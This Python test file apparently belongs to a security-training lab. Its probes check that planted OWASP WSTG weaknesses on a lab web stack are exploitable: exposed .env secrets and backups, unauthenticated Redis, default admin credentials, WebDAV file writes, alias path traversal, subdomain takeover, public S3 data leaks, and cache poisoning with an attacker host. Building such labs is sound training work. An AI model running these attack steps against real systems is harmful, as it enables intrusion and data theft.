"""WSTG probes for machine 01 - Information Gathering + Configuration/Deployment.

Each probe asserts that the intentional weakness is demonstrably present.
"""
import io
import re
import socket
import tarfile
import urllib.parse
import uuid

from labhttp import get, post, raw, request

SECRET = "Sup3rS3cretPortalPW"


def _hp(ctx, key):
    host, _, port = ctx.endpoints[key].partition(":")
    return host, int(port)


# --- WSTG-INFO ---------------------------------------------------------------

def info_01(ctx):
    base = ctx.url("search")
    get(base + "/recrawl", timeout=120)
    r = get(base + "/search?q=password")
    hits = r.json().get("results", [])
    sensitive = [h["url"] for h in hits if re.search(r"\.env|config|secret|backup|admin", h["url"], re.I)]
    robots = get(ctx.url("/robots.txt")).text
    ok = bool(sensitive) and "Disallow: /secret/" in robots
    return ok, f"dork 'password' -> {len(hits)} hits; sensitive={sensitive[:3]}"


def info_02(ctx):
    a = get(ctx.url("/")).header("Server", "")
    b = get(ctx.url("apache") + "/").header("Server", "")
    ok = bool(re.search(r"nginx/\d+\.\d+", a)) and bool(re.search(r"Apache/\d+\.\d+", b))
    return ok, f"front Server={a!r}; apache Server={b!r}"


def info_03(ctx):
    paths = ["/robots.txt", "/sitemap.xml", "/crossdomain.xml",
             "/clientaccesspolicy.xml", "/.well-known/security.txt", "/humans.txt"]
    codes = {p: get(ctx.url(p)).status for p in paths}
    xd = get(ctx.url("/crossdomain.xml")).text
    sec = get(ctx.url("/.well-known/security.txt")).text
    ok = (all(c == 200 for c in codes.values())
          and 'domain="*"' in xd
          and "Disallow: /secret/" in get(ctx.url("/robots.txt")).text
          and "acme.internal" in sec)
    return ok, f"metafiles={codes}; crossdomain wildcard={'domain=\"*\"' in xd}"


def info_04(ctx):
    lo, hi = (int(x) for x in ctx.manifest["port_block"].split("-"))
    opened = []
    for p in range(lo, hi + 1):
        s = socket.socket()
        s.settimeout(0.3)
        try:
            if s.connect_ex(("127.0.0.1", p)) == 0:
                opened.append(p)
        finally:
            s.close()
    urls = re.findall(r"<loc>([^<]+)</loc>", get(ctx.url("/sitemap.xml")).text)
    ok = len(opened) >= 6 and len(urls) >= 10
    return ok, f"{len(opened)} open ports {opened}; sitemap exposes {len(urls)} paths"


def info_05(ctx):
    body = get(ctx.url("/")).text
    checks = {
        "creds_in_comment": SECRET in body and "<!--" in body,
        "internal_ip": "10.20.30.41" in body,
        "hidden_tenant": 'type="hidden"' in body and "acme-internal-001" in body,
        "js_api_key": "ak_live_7f3c9d21e8b44a0f9c6d5e2b1a09f8e7" in body,
    }
    return all(checks.values()), str(checks)


def info_06(ctx):
    body = get(ctx.url("/")).text
    forms = re.findall(r'<form[^>]*action="([^"]+)"[^>]*method="([^"]+)"', body, re.I)
    g = get(ctx.url("/search?q=entryprobe&tenant=t1"))
    p = post(ctx.url("/contact"), data="name=entryprobe&email=p%40x.test&message=hi",
             headers={"Content-Type": "application/x-www-form-urlencoded"})
    ok = (len(forms) >= 2 and g.status == 200 and "entryprobe" in g.text and p.status == 200)
    return ok, f"forms={forms}; GET reflected={'entryprobe' in g.text}; POST={p.status}"


def info_07(ctx):
    seen, queue = set(), ["/"]
    while queue:
        p = queue.pop(0)
        if p in seen:
            continue
        seen.add(p)
        r = get(ctx.url(p))
        if r.status != 200:
            continue
        for href in re.findall(r'href="([^"]+)"', r.text):
            nxt = urllib.parse.urljoin(p, href)
            if nxt.startswith("/") and nxt not in seen:
                queue.append(nxt)
    target = "/reports/quarterly/export"
    ok = target in seen and len(seen) >= 6
    return ok, f"crawled {len(seen)} paths; deep export reached={target in seen}"


def info_08(ctx):
    r = get(ctx.url("/boom"))
    nf = get(ctx.url("/definitely-not-a-page"))
    ok = r.status == 500 and "Werkzeug" in r.text and "Flask" in r.text and nf.status == 404
    return ok, f"/boom={r.status} Werkzeug={'Werkzeug' in r.text} Flask={'Flask' in r.text}; 404={nf.status}"


def info_09(ctx):
    home = get(ctx.url("/"))
    cl = get(ctx.url("/CHANGELOG.txt"))
    app = get(ctx.url("/products"))
    ok = ("AcmePortal 3.2.1" in home.text and cl.status == 200
          and "3.2.1" in cl.text and app.header("X-App-Version") == "3.2.1")
    return ok, f"generator={'AcmePortal 3.2.1' in home.text}; changelog={cl.status}; X-App-Version={app.header('X-App-Version')}"


def info_10(ctx):
    tiers = {}
    front = get(ctx.url("/"))
    if "nginx" in front.header("Server", ""):
        tiers["proxy"] = front.header("Server")
    cached = get(ctx.url("cache") + "/cached/page")
    if cached.header("Via") or cached.header("X-Cache"):
        tiers["cache"] = cached.header("Via") or ("varnish/X-Cache=" + str(cached.header("X-Cache")))
    if cached.header("X-Backend"):
        tiers["app"] = cached.header("X-Backend")
    internal = get(ctx.url("/api/internal/users"))
    if internal.status == 200 and internal.json().get("db_engine"):
        tiers["db"] = internal.json()["db_engine"] + "@" + internal.json().get("db_host", "?")
    ok = len(tiers) >= 4
    return ok, f"mapped {len(tiers)} tiers: {tiers}"


# --- WSTG-CONF ---------------------------------------------------------------

def conf_01(ctx):
    host, port = _hp(ctx, "redis")
    info = raw(host, port, "INFO\r\n", timeout=10)
    ping = raw(host, port, "PING\r\n", timeout=10)
    ver = re.search(rb"redis_version:([0-9.]+)", info)
    ok = ver is not None and b"PONG" in ping
    return ok, f"unauthenticated Redis: version={ver.group(1).decode() if ver else None}, PING={ping[:12]!r}"


def conf_02(ctx):
    home = get(ctx.url("apache") + "/")
    dav = get(ctx.url("apache") + "/dav/")
    bk = get(ctx.url("/backup/"))
    ok = ("It works!" in home.text and "Index of" in dav.text
          and "Index of" in bk.text and "site-2019.tar.gz" in bk.text)
    return ok, f"default_page={'It works!' in home.text}; apache_autoindex={'Index of' in dav.text}; nginx_autoindex={'Index of' in bk.text}"


def conf_03(ctx):
    env = get(ctx.url("/.env"))
    bak = get(ctx.url("/config.php.bak"))
    php = get(ctx.url("apache") + "/phpinfo.php")
    inc = get(ctx.url("apache") + "/config.inc")
    ok = (env.status == 200 and f"DB_PASSWORD={SECRET}" in env.text
          and bak.status == 200 and "<?php" in bak.text
          and php.status == 200 and "phpinfo()" in php.text
          and inc.status == 200 and "password" in inc.text)
    return ok, f".env={env.status}(secrets={'DB_PASSWORD=' + SECRET in env.text}); php.bak={bak.status}; phpinfo_source={php.status}; .inc={inc.status}"


def conf_04(ctx):
    t = get(ctx.url("/backup/site-2019.tar.gz"))
    is_gzip = t.status == 200 and t.body[:2] == b"\x1f\x8b"
    names, leaked = [], False
    if is_gzip:
        with tarfile.open(fileobj=io.BytesIO(t.body), mode="r:gz") as tf:
            names = tf.getnames()
            leaked = any(n.endswith(("config.ini", ".env")) for n in names)
    swap = get(ctx.url("/index.php~"))
    ds = get(ctx.url("/.DS_Store"))
    ab = get(ctx.url("/admin-backup/README.txt"))
    ok = is_gzip and leaked and swap.status == 200 and ds.status == 200 and ab.status == 200 and "admin" in ab.text
    return ok, f"tarball={t.status} members={names} secrets_inside={leaked}; index.php~={swap.status}; .DS_Store={ds.status}; admin-backup={ab.status}"


def conf_05(ctx):
    targets = {
        "adminer": ctx.url("adminer") + "/",
        "server-status": ctx.url("apache") + "/server-status",
        "server-info": ctx.url("apache") + "/server-info",
        "stub_status": ctx.url("stub_status") + "/nginx_status",
    }
    bodies = {k: get(v) for k, v in targets.items()}
    codes = {k: r.status for k, r in bodies.items()}
    login = post(ctx.url("/login"), data="username=admin&password=admin",
                 headers={"Content-Type": "application/x-www-form-urlencoded"})
    ok = (all(c == 200 for c in codes.values())
          and "Adminer" in bodies["adminer"].text
          and "Apache Server Status" in bodies["server-status"].text
          and "Active connections" in bodies["stub_status"].text
          and login.status == 200)
    return ok, f"admin_interfaces={codes}; default_creds_login={login.status}"


def conf_06(ctx):
    tr = request("TRACE", ctx.url("apache") + "/", headers={"X-Wstg-Probe": "trace-echo"})
    opt = request("OPTIONS", ctx.url("apache") + "/dav/")
    allow = opt.header("Allow", "")
    # Apache's DAV Allow header omits PUT, so prove write access by writing.
    dav_name = f"dav-{uuid.uuid4().hex[:8]}.txt"
    dav_put = request("PUT", ctx.url("apache") + "/dav/" + dav_name, data="apache-dav-owned")
    dav_get = get(ctx.url("apache") + "/dav/" + dav_name)
    dav_del = request("DELETE", ctx.url("apache") + "/dav/" + dav_name)
    name = f"probe-{uuid.uuid4().hex[:8]}.txt"
    put = request("PUT", ctx.url("/files/") + name, data="owned-by-wstg")
    got = get(ctx.url("/files/") + name)
    dele = request("DELETE", ctx.url("/files/") + name)
    ok = (tr.status == 200 and "X-Wstg-Probe" in tr.text
          and "DELETE" in allow and "PROPFIND" in allow
          and dav_put.status in (201, 204) and "apache-dav-owned" in dav_get.text
          and dav_del.status in (200, 204)
          and put.status in (201, 204) and got.status == 200 and "owned-by-wstg" in got.text
          and dele.status in (200, 204))
    return ok, (f"TRACE={tr.status}(echoed={'X-Wstg-Probe' in tr.text}); Allow={allow!r}; "
                f"apache_DAV PUT={dav_put.status}/DELETE={dav_del.status}; "
                f"nginx_DAV PUT={put.status}/readback={got.status}/DELETE={dele.status}")


def conf_07(ctx):
    tls = get(ctx.url("https") + "/")
    plain = get(ctx.url("/"))
    hsts = tls.header("Strict-Transport-Security")
    ok = tls.status == 200 and hsts is None and plain.status == 200
    return ok, f"https={tls.status} HSTS={hsts!r}; http={plain.status} (no redirect to TLS)"


def conf_09(ctx):
    r = get(ctx.url("/debug/files"))
    files = {f["path"]: f for f in r.json().get("files", [])}
    up = files.get("/srv/data/uploads", {})
    cfg = files.get("/srv/data/config.ini", {})
    name = f"perm-{uuid.uuid4().hex[:8]}.txt"
    put = request("PUT", ctx.url("/files/") + name, data="x")
    request("DELETE", ctx.url("/files/") + name)
    ok = (up.get("mode") == "0o777" and up.get("world_writable") is True
          and cfg.get("mode") == "0o644" and put.status in (201, 204))
    return ok, f"uploads={up.get('mode')} world_writable={up.get('world_writable')}; config.ini={cfg.get('mode')}; webroot_PUT={put.status}"


def conf_10(ctx):
    import dns.resolver
    host, port = _hp(ctx, "dns")
    res = dns.resolver.Resolver(configure=False)
    res.nameservers = [host]
    res.port = port
    res.timeout = 5
    res.lifetime = 10
    cname = str(res.resolve("dangling.lab.test", "CNAME")[0].target).rstrip(".")
    saas = ctx.url("saas")
    # Reset to the deprovisioned state so the probe is idempotent across runs.
    post(saas + "/release", data={"hostname": "dangling.lab.test"})
    unclaimed = get(saas + "/", headers={"Host": "dangling.lab.test"})
    claim = post(saas + "/claim", data={"hostname": "dangling.lab.test",
                                        "content": "<h1>wstg-takeover</h1>"})
    taken = get(saas + "/", headers={"Host": "dangling.lab.test"})
    try:
        res.resolve("abandoned.lab.test", "A")
        nx = False
    except dns.resolver.NXDOMAIN:
        nx = True
    ok = (cname == "unclaimed-saas.lab.test" and unclaimed.status == 404
          and "GitHub Pages" in unclaimed.text and claim.status == 201
          and taken.status == 200 and "wstg-takeover" in taken.text and nx)
    return ok, (f"CNAME={cname}; unclaimed={unclaimed.status}; claim={claim.status}; "
                f"after_claim={taken.status} owned={'wstg-takeover' in taken.text}; abandoned_NXDOMAIN={nx}")


def conf_11(ctx):
    s3 = ctx.url("s3")
    pub = get(s3 + "/acme-public-assets/customers.csv")
    lst = get(s3 + "/acme-public-assets?list-type=2")
    env = get(s3 + "/acme-public-assets/portal.env")
    policy = get(s3 + "/acme-public-assets?policy").text
    pub_acl = get(s3 + "/acme-public-assets?acl").text
    priv_acl = get(s3 + "/acme-private-backups?acl").text
    # The finding: a bucket policy grants Principal "*" and anonymous callers
    # can actually read PII and credentials out of it.
    ok = (pub.status == 200 and "ssn" in pub.text and lst.status == 200
          and env.status == 200 and SECRET in env.text
          and '"Principal": "*"' in policy and '"Effect": "Allow"' in policy
          and "AllUsers" in pub_acl and "AllUsers" not in priv_acl)
    return ok, (f"anonymous object={pub.status} list={lst.status} .env={env.status}; "
                f"policy Principal=*={'\"Principal\": \"*\"' in policy}; "
                f"public_ACL_AllUsers={'AllUsers' in pub_acl}; private_ACL_AllUsers={'AllUsers' in priv_acl}")


def conf_12(ctx):
    a = get(ctx.url("/search?q=x"))
    b = get(ctx.url("/reports"))
    csp = a.header("Content-Security-Policy", "")
    ok = ("'unsafe-inline'" in csp and "'unsafe-eval'" in csp and "*" in csp
          and b.header("Content-Security-Policy") is None)
    return ok, f"/search CSP={csp!r}; /reports CSP={b.header('Content-Security-Policy')!r}"


def conf_13(ctx):
    trav = get(ctx.url("/static../secret/flag.txt"))
    denied = get(ctx.url("/admin/users"))
    bypass = get(ctx.url("/apiadmin/users"))
    ok = (trav.status == 200 and "WSTG-M01{" in trav.text
          and denied.status == 403 and bypass.status == 200 and "users" in bypass.text)
    return ok, f"alias_traversal={trav.status}(flag={'WSTG-M01{' in trav.text}); /admin/users={denied.status}; /apiadmin/users={bypass.status}"


def conf_14(ctx):
    wanted = ("X-Content-Type-Options", "X-Frame-Options", "Referrer-Policy",
              "Permissions-Policy", "Cross-Origin-Opener-Policy",
              "Cross-Origin-Embedder-Policy", "Cross-Origin-Resource-Policy")
    missing = {}
    for p in ("/", "/search?q=x"):
        r = get(ctx.url(p))
        missing[p] = [h for h in wanted if r.header(h) is None]
    ok = len(missing) == 2 and all(len(v) >= 6 for v in missing.values())
    return ok, f"absent security headers: {missing}"


def conf_15(ctx):
    fl = get(ctx.url("/flags.json"))
    off = get(ctx.url("/feature-preview"))
    cookie = get(ctx.url("/feature-preview"), headers={"Cookie": "ff_new_admin=1"})
    header = get(ctx.url("/feature-preview"), headers={"X-Feature-Flag": "ff_new_admin"})
    ok = (fl.status == 200 and "ff_new_admin" in fl.text and off.status == 403
          and cookie.status == 200 and header.status == 200 and "WSTG-M01{" in cookie.text)
    return ok, f"flags.json={fl.status}; no_flag={off.status}; cookie_flag={cookie.status}; header_flag={header.status}"


def conf_16(ctx):
    cache = ctx.url("cache")
    path = f"/cached/page?probe={uuid.uuid4().hex[:8]}"
    evil = "evil.attacker.test"
    poison = get(cache + path, headers={"X-Forwarded-Host": evil})
    victim = get(cache + path)
    ok = (poison.status == 200 and evil in poison.text
          and victim.header("X-Cache") == "HIT" and evil in victim.text)
    return ok, (f"poison X-Cache={poison.header('X-Cache')}; victim X-Cache={victim.header('X-Cache')} "
                f"attacker_host_served_to_victim={evil in victim.text}")